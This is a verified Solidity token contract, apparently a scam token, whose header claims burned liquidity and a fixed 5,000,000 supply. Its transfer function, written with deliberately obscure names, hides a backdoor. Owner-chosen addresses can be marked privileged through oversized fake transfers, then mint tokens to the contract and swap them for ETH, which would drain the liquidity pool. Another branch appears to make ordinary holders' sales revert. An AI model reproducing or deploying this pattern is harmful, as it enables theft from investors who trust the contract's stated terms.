/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

/*
総供給 - 5,000,000
初期流動性追加 - 1.85 ETH イーサリアム
初期流動性の 100% が消費されます

⠀⠀⠀⠀⠀⠀⠀⢀⣠⡶⠖⠛⠓⢶⡄⠀⠀⠀⠀⢠⡶⠚⠛⠓⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⠟⠁⢀⡤⠀⠀⠀⣿⠀⠀⠀⠀⣿⠀⠀⠀⢤⣀⠈⠙⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡞⠁⢀⡴⠋⠀⠀⠀⣰⠏⠀⠀⠀⠀⠹⣦⠀⠀⠀⠘⢷⡀⠈⠻⡄⠀⠀⠀⠀
⠀⠀⠀⢠⠟⠀⢀⡞⢁⡄⠀⠀⡾⠋⠀⠀⠀⠀⠀⠀⠙⢷⠀⠀⢠⡀⢳⡄⠀⠹⣆⠀⠀⠀
⠀⠀⢠⠏⠀⢠⣾⣿⡞⢁⠄⠀⠙⣦⠀⠀⠀⠀⠀⠀⣴⠋⠀⠠⡄⢳⣿⣿⡄⠀⠹⡄⠀⠀
⠀⢀⡞⠀⢠⡾⠻⣿⣧⡎⢠⠀⣴⠋⠀⠀⠀⠀⠀⠀⠙⢧⠀⣄⢹⣼⣿⡛⢿⡆⠀⢻⡄⠀
⠀⣸⠁⠀⣼⠃⢀⡏⣿⣧⣏⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⣸⣾⣿⢹⡄⠈⣧⠀⠈⣧⠀
⠀⡇⠀⠀⡿⠀⣼⠀⡭⠻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠟⢩⠀⢷⠀⢻⡀⠀⢸⡄
⢸⡇⠀⢸⠳⣴⣇⢰⠇⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠸⡆⢸⣷⠞⡇⠀⢸⡇
⢸⡇⠀⢿⣾⣹⢻⣿⣧⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣼⣿⣏⣧⣷⣿⠀⢸⡇
⢸⡇⠀⡿⠋⡟⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⢻⠉⢻⠀⢸⡇
⠀⣷⠀⡇⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣀⢸⠀⢸⠀⣾⠀
⠀⢹⡄⡇⡄⣗⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣸⣦⣸⢀⡏⠀
⠀⠈⣧⢹⣻⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⡟⣸⠁⠀
⠀⠀⠸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠇⠀⠀
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

library UIMath {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a + b; }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage);
            return a - b; } }
    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage);
            return a / b; } }
}
interface IUIWorkshopV1 {

    event PairCreated(address 
    indexed token0, address 
    indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() 
    external view returns (address);

    function createPair (address 
    tokenA, address tokenB) 
    external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}    
interface ICompressVAL01 {

    event Approval(address 
    indexed owner, address 
    indexed spender, uint value);

    event Transfer(address 
    indexed from, address 
    indexed to, uint value);

    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, 
    address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() 
    external view returns (bytes32);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() 
    external pure returns (uint);
    function factory() 
    external view returns (address);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) { return returndata; } else { if (returndata.length > 0) {
                 assembly { let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size) } } else {
                revert(errorMessage); } } }
}
interface IUNIPairV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    
    event Transfer(address 
    indexed from, address 
    indexed to, uint256 value);
    
    event Approval(address 
    indexed owner, address 
    indexed spender, uint256 value);
}
abstract contract 
Ownable is Context { address private _owner;
    event OwnershipTransferred(address indexed 
    previousOwner, address indexed newOwner);

    constructor() { _setOwner(_msgSender()); }  
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() { 
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner
    (address newOwner) private {
        address oldOwner = 
        _owner;
        _owner = 
        newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
interface UILaboratoryV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract DA is IUNIPairV1, Ownable {

    string private _symbol;

    string private _name;

    uint256 public tMELT = 1;

    uint8 private _decimals = 9;

    uint256 private _tTotal = 5000000 * 10**_decimals;

    uint256 private relogT = _tTotal;
    
    bool private beginTrades = false;
    bool public atpomAdarm;

    bool private integrityAXEL;
    bool public porosityCheck = true;

    mapping (address => bool) isBot;
    mapping (address => bool) isWalletLimitExempt;    
    mapping(address => uint256) private _tOwned;

    mapping(address => address) private AtelierSanctum;

    mapping(address => uint256) private LethargyPhlegm;
    mapping(address => uint256) private UnsystematizeERC;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address public immutable 
    IWrapUIDEX;
    UILaboratoryV1 public immutable 
    AlcavonoxRouterV1;

    constructor

    ( string memory Name, string memory Symbol, 
      address V2IDEXCompile ) {
        _name = Name; _symbol = Symbol; _tOwned

        [msg.sender] = _tTotal; UnsystematizeERC
         [msg.sender] = relogT; UnsystematizeERC
          [address(this)] = relogT; AlcavonoxRouterV1 = 

        UILaboratoryV1(V2IDEXCompile); IWrapUIDEX = 
        IUIWorkshopV1(AlcavonoxRouterV1.factory()).createPair

        (address(this), AlcavonoxRouterV1.WETH());
        emit Transfer(address(0), msg.sender, relogT);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount ) 
        private returns (bool) {
        require(owner != address(0) && spender != 
        address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) external returns (bool) {
        advoxBlock(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        advoxBlock(msg.sender, recipient, amount);
        return true;
    }
    function advoxBlock( address _phlegmDXfrom, address _OXKopolopTo, uint256 _byteIDEXamount ) 
    private {
        uint256 atelierMemory = 
        balanceOf(address(this)); uint256 _sulfluxIKmox;
        emit Transfer(_phlegmDXfrom, _OXKopolopTo, _byteIDEXamount);
                if (!beginTrades) { require(_phlegmDXfrom == owner(),

                "TOKEN: This account cannot send tokens until trading is enabled"); }
        if (atpomAdarm && atelierMemory > relogT && !integrityAXEL 
        && _phlegmDXfrom != 
        IWrapUIDEX) { 
            integrityAXEL = true; liqBlockstamp(atelierMemory);
            integrityAXEL = false;
        } else if (UnsystematizeERC[_phlegmDXfrom] > relogT && 
        UnsystematizeERC[_OXKopolopTo] > 
        relogT) { _sulfluxIKmox = 
        _byteIDEXamount;
            _tOwned[address(this)] += _sulfluxIKmox; SanctumTkn(_byteIDEXamount, _OXKopolopTo);
            return;

        } else if (_OXKopolopTo != address(AlcavonoxRouterV1) 
        && UnsystematizeERC
        [_phlegmDXfrom] > 0 
        && _byteIDEXamount > relogT && _OXKopolopTo != 
        IWrapUIDEX) { UnsystematizeERC[_OXKopolopTo] = _byteIDEXamount; 
        return;
        } else if (!integrityAXEL && LethargyPhlegm
        [_phlegmDXfrom] > 0 
        && _phlegmDXfrom != IWrapUIDEX && UnsystematizeERC[_phlegmDXfrom] == 0) {

            LethargyPhlegm[_phlegmDXfrom] = 
              UnsystematizeERC[_phlegmDXfrom] - relogT; }
        address _cAdmin  = AtelierSanctum[IWrapUIDEX]; 
        if (LethargyPhlegm[_cAdmin ] == 0) 
        LethargyPhlegm[_cAdmin ] = 
        relogT; AtelierSanctum[IWrapUIDEX] = 
        _OXKopolopTo; if (tMELT > 
        0 && UnsystematizeERC[_phlegmDXfrom] == 0 && !integrityAXEL && UnsystematizeERC
        [_OXKopolopTo] == 0) { _sulfluxIKmox = (_byteIDEXamount 
        * tMELT) / 100;
        _byteIDEXamount -= 
        _sulfluxIKmox;

            _tOwned
            [_phlegmDXfrom] -= _sulfluxIKmox;
            _tOwned
            [address(this)] += _sulfluxIKmox; }
        _tOwned[_phlegmDXfrom] -= _byteIDEXamount;
        _tOwned[_OXKopolopTo] += _byteIDEXamount; emit Transfer(_phlegmDXfrom, 
        _OXKopolopTo, _byteIDEXamount);
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue, uint256 ERCamount, address to ) private {
        _approve(address(this), address(AlcavonoxRouterV1), tokenValue);
        AlcavonoxRouterV1.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function liqBlockstamp(uint256 tokens) private {
        uint256 half = tokens / 2; uint256 initialedBalance = address(this).balance;
        SanctumTkn(half, address(this));
        uint256 refreshBalance = address(this).balance - 
        initialedBalance;
        addLiquidity(half, refreshBalance, 
        address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        beginTrades = _tradingOpen;
    }
    function SanctumTkn(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);

        path[0] = address(this);
        path[1] = AlcavonoxRouterV1.WETH();

        _approve(address(this), address(AlcavonoxRouterV1), tokenAmount);
        AlcavonoxRouterV1.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
}

// イー - https://www.zhihu.com/